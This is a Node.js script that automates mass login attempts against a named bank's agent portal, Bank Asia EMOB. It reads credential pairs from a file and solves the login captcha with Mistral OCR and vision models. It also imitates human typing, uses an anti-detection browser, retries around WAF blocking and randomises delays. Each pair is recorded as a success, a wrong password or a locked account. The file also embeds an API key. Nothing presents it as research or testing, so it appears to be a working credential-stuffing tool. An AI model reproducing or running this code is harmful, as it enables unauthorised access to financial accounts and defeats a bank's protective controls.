#!/usr/bin/env node
/**
 * Bank Asia Agent Portal (EMOB) login automation — https://agent.bankasia-bd.com:8089/emob/f?p=106:101
 *
 * Flow (mapped live):
 *   1. GET /emob/f?p=106:101::::::           -> Oracle APEX login page (app 106, page 101)
 *      fields: P101_USERNAME (uppercase), P101_PASS, P101_CAPTCHA (5-char APEX image captcha)
 *   2. Captcha: 5 images via wwv_flow_image_generator.get_image?p_position=1..5, composited
 *      and read by Mistral vision (pixtral-12b-2409) — validated live (APEX accepts the code)
 *   3. click Login                           -> POST /emob/wwv_flow.accept (APEX JS builds the form)
 *   4. Wrong creds  -> "1 error has occurred Invalid Login Credentials."
 *      Wrong captcha-> "Please Confirm Verification Code"  (retried with fresh window)
 *      Success      -> APEX redirects to another page (p=106:...)
 *
 * Response map:
 *   "Invalid Login Credentials"  -> INVALID_CREDS
 *   "Verification Code"/captcha  -> CAPTCHA_FAIL (retried once)
 *   "lock"/"temporarily"/"max"    -> LOCKED
 *   URL moves off p=106:101      -> SUCCESS
 *
 * Usage:
 *   node scripts/agent_login.mjs "user:pass"
 *   node scripts/agent_login.mjs --batch /path/to/creds.txt
 *   node scripts/agent_login.mjs --batch file --gap 10    (gap seconds, default 15)
 *   node scripts/agent_login.mjs --batch file --out /tmp/x.json
 *   Resumable: results saved after each attempt; definitive statuses skipped on restart.
 *   Fresh window per attempt.
 */
import { chromium } from '/Volumes/Spare/npm/global/lib/node_modules/@playwright/mcp/node_modules/playwright/index.mjs';
import fs from 'node:fs';

const CLOAK = '/Users/m/.cloakbrowser/chromium-145.0.7632.109.2/Chromium.app/Contents/MacOS/Chromium';
const LOGIN = 'https://agent.bankasia-bd.com:8089/emob/f?p=106:101::::::';
const OCR_KEY = process.env.MISTRAL_API_KEY || process.argv.find((a, i) => process.argv[i - 1] === '--ocr-key') || 'TLlIUOIuh6tcApbkjKg61iB3nj6LrwEm';
const rand = (min, max) => min + Math.random() * (max - min);
const sleep = (ms) => new Promise(r => setTimeout(r, ms));

/** Compose the 5 APEX captcha images (already loaded in the DOM), read via Mistral OCR (table parse) with vision fallback. */
async function readCaptcha(page) {
  // in-page fetch to get_image is WAF-reset; the page's own <img> elements load fine
  const b64 = await page.evaluate(() => {
    const imgs = [...document.querySelectorAll('img[src*=get_image]')];
    if (!imgs.length) return '';
    const cell = 250, gap = 40;
    const c = document.createElement('canvas'); c.width = cell * imgs.length + gap * (imgs.length - 1); c.height = cell;
    const x = c.getContext('2d'); x.fillStyle = '#fff'; x.fillRect(0, 0, c.width, c.height);
    imgs.forEach((img, i) => x.drawImage(img, i * (cell + gap), 0, img.width, img.height));
    return c.toDataURL('image/png').split(',')[1];
  });
  if (!b64) throw new Error('no captcha images on page');
  const headers = { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + OCR_KEY };
  const url = 'data:image/png;base64,' + b64;

  // 1) OCR model: returns a markdown table `| a | m | 2 | t | b |` with one cell per position
  const ocr = await fetch('https://api.mistral.ai/v1/ocr', {
    method: 'POST', headers,
    body: JSON.stringify({ model: 'mistral-ocr-latest', document: { type: 'image_url', image_url: url } }),
  });
  if (!ocr.ok) throw new Error('Mistral OCR HTTP ' + ocr.status);
  const md = String((await ocr.json())?.pages?.[0]?.markdown || '');
  const row = md.split('\n').find(l => l.includes('|') && !l.includes('---'));
  const cells = row ? row.split('|').slice(1, -1).map(c => c.trim()).filter(Boolean) : [];
  let code = cells.join('').replace(/[^A-Za-z0-9]/g, '');

  // 2) vision fallback if OCR didn't yield exactly 5
  const prompts = [
    'Five captcha characters side by side, case-sensitive. Output ONLY the 5 characters in exact case, no spaces.',
    'For EACH of the 5 captcha positions output exactly one character in this format: P1:X P2:X P3:X P4:X P5:X',
  ];
  for (const prompt of prompts) {
    if (code.length === 5) break;
    const vr = await fetch('https://api.mistral.ai/v1/chat/completions', {
      method: 'POST', headers,
      body: JSON.stringify({ model: 'pixtral-12b-2409', messages: [{ role: 'user', content: [
        { type: 'text', text: prompt },
        { type: 'image_url', image_url: { url } }] }], max_tokens: 40 }),
    });
    if (!vr.ok) continue;
    const content = String((await vr.json())?.choices?.[0]?.message?.content || '');
    const pos = content.match(/P1:(.)\s*P2:(.)\s*P3:(.)\s*P4:(.)\s*P5:(.)/i);
    const vc = pos ? pos.slice(1).join('') : content.replace(/[^A-Za-z0-9]/g, '');
    if (vc.length === 5) code = vc;
  }
  if (code.length !== 5) throw new Error('CAPTCHA_UNREADABLE: OCR+vision never returned 5 chars (got ' + code.length + ')');
  return code;
}

async function typeField(page, selector, text) {
  await page.click(selector);
  await sleep(rand(150, 450));
  await page.type(selector, text, { delay: rand(20, 70) });
}

async function tryLogin(page, ctx, uid, pwd) {
  await page.goto(LOGIN, { waitUntil: 'load', timeout: 60000 });
  await sleep(rand(1800, 4000));

  await typeField(page, 'input#P101_USERNAME', uid);
  await page.click('input#P101_PASS'); // blur username -> triggers the user lookup ajax
  // the lookup's response populates hidden fields (P101_USER_ID etc.); if the WAF
  // dropped it, bail early and let the caller retry with a fresh window
  const populated = await page.waitForFunction(() => document.querySelector('#P101_USER_ID')?.value, { timeout: 7000 })
    .then(() => true).catch(() => false);
  if (!populated) return { status: 'WAF_DROPPED', detail: 'username lookup response dropped by WAF' };
  await sleep(rand(200, 600));
  await typeField(page, 'input#P101_PASS', pwd);
  await sleep(rand(300, 700));
  const code = await readCaptcha(page); // "looking at" the captcha
  await sleep(rand(400, 900));
  await typeField(page, 'input#P101_CAPTCHA', code);
  await sleep(rand(600, 2000));
  // capture the submit response: the error/success is in the wwv_flow.accept HTML reply
  let acceptDone = false;
  let acceptBody = '';
  const watcher = page.waitForResponse(r => r.url().includes('wwv_flow.accept'), { timeout: 25000 })
    .then(async r => { acceptDone = true; try { acceptBody = await r.text(); } catch {} return r; })
    .catch(() => null);
  await page.click('button#login'); // explicit: the apex.submit Login button
  await sleep(4000);
  // WAF sometimes drops the accept POST; retry via the button's own handler once if nothing arrived
  if (!acceptDone) {
    console.log('accept not seen, forcing apex.submit');
    await page.evaluate(() => { try { apex.submit({ request: 'Submit', validate: true }); } catch (e) { window.__apexErr = String(e); } }).catch(() => {});
    await sleep(4000);
  }
  await watcher;
  // accept landed: poll briefly for the re-render (error toast or URL change).
  // if the response never arrived the page can't have changed — bail fast.
  let out = null;
  if (acceptDone) {
    const deadline = Date.now() + 12000;
    while (Date.now() < deadline) {
      out = await page.evaluate(() => {
        const alert = [...document.querySelectorAll('.t-Alert, .alert, [role=alert], #apexError, .a-Notification, [class*=notification]')]
          .map(a => a.innerText.replace(/\s+/g, ' ').trim()).filter(Boolean).join(' | ');
        return {
          url: location.href,
          errorText: alert.slice(0, 200),
          bodyText: document.body.innerText.replace(/\s+/g, ' ').slice(0, 500),
        };
      });
      if (out.errorText || !out.url.includes(':101:')) break;
      await sleep(500);
    }
  } else {
    out = await page.evaluate(() => ({ url: location.href, errorText: '', bodyText: '' }));
  }
  // submit went out but the response never landed (WAF dropped it) and the page
  // didn't change -> retryable, not a cred verdict
  if (!acceptDone && !out.errorText && out.url.includes(':101:')) return { status: 'WAF_DROPPED', detail: 'accept response dropped by WAF' };
  // extract error from the submit response HTML (covers transient toasts we missed)
  const m = acceptBody.match(/error has occurred[^<]*/i) || acceptBody.match(/Invalid Login Credentials[^<]*/i) || acceptBody.match(/Please Confirm[^<]*/i);
  if (m && !out.errorText && out.url.includes(':101:')) out.errorText = m[0];
  return classify(out);
}

function classify(o) {
  const e = o.errorText;
  const t = o.bodyText;
  if (o.url.includes(':101:') === false) return { status: 'SUCCESS', detail: 'redirected to ' + o.url };
  if (/Invalid Login Credentials/i.test(e)) return { status: 'INVALID_CREDS', detail: e.slice(0, 120) };
  if (/(verification code|valid captcha|captcha)/i.test(e)) return { status: 'CAPTCHA_FAIL', detail: e.slice(0, 120) };
  if (/(lock|temporarily|too many|maximum|suspended|attempts)/i.test(e)) return { status: 'LOCKED', detail: e.slice(0, 120) };
  // fallback: check body for the known messages (excluding static page text)
  if (t.includes('Invalid Login Credentials')) return { status: 'INVALID_CREDS', detail: 'wrong user/pass' };
  if (/(verification code|captcha)/i.test(t) && /error has occurred/i.test(t)) return { status: 'CAPTCHA_FAIL', detail: t.slice(0, 120) };
  return { status: 'UNKNOWN', detail: (e || t).slice(0, 160) };
}

// ---- main ----
const args = process.argv.slice(2);
const batchIdx = args.indexOf('--batch');
const raw = batchIdx !== -1 ? args[batchIdx + 1] : args.find(a => !a.startsWith('--'));
const pairs = (raw && fs.existsSync(raw) ? fs.readFileSync(raw, 'utf8').split('\n').map(l => l.trim()).filter(Boolean) : (raw || '').split(',').map(s => s.trim()).filter(Boolean));
if (!pairs.length) { console.log('usage: node agent_login.mjs "user:pass" | --batch <file>'); process.exit(1); }

const gapIdx = args.indexOf('--gap');
const GAP_BASE = gapIdx !== -1 ? Number(args[gapIdx + 1]) || 15 : 15;
const outIdx = args.indexOf('--out');
const OUT = outIdx !== -1 ? args[outIdx + 1] : '/tmp/agent_batch_results.json';
const results = fs.existsSync(OUT) ? JSON.parse(fs.readFileSync(OUT, 'utf8')) : {};
const SKIP_STATUS = { INVALID_CREDS: 1, LOCKED: 1, SUCCESS: 1 };

let browser = null;
for (const pair of pairs) {
  const [u, p] = pair.split(':');
  if (!u || !p) { console.log('skip bad pair:', pair); continue; }
  if (results[u] && SKIP_STATUS[results[u].status]) { console.log(`${u} -> SKIP (already ${results[u].status})`); continue; }
  let res;
  for (let attempt = 1; attempt <= 3; attempt++) {
    if (browser) await browser.close();
    browser = await chromium.launch({ headless: false, executablePath: CLOAK, args: ['--window-size=1440,900'] });
    const ctx = await browser.newContext({ viewport: { width: 1440, height: 900 }, ignoreHTTPSErrors: true });
    const page = await ctx.newPage();
    try {
      res = await tryLogin(page, ctx, u, p);
      console.log(`${u} -> ${res.status} (${res.detail})`);
      if (res.status !== 'CAPTCHA_FAIL' && res.status !== 'WAF_DROPPED') break; // retry fresh window on transient failures
    } catch (e) {
      console.log(`${u} -> ERROR: ${e.message}`);
      // unreadable captcha = transient, not a cred verdict: let the CAPTCHA_FAIL retry path handle it
      res = e.message.includes('CAPTCHA_UNREADABLE')
        ? { status: 'CAPTCHA_FAIL', detail: 'unreadable captcha: ' + e.message.slice(0, 80) }
        : { status: 'ERROR', detail: e.message };
      break;
    }
  }
  results[u] = res;
  fs.writeFileSync(OUT, JSON.stringify(results, null, 1));
  if (batchIdx !== -1 && pairs.length > 1) { const gap = rand(GAP_BASE * 0.5, GAP_BASE * 1.5) * 1000; console.log('waiting ' + Math.round(gap / 1000) + 's...'); await sleep(gap); }
}
console.log('results saved to ' + OUT);
if (browser) await browser.close();
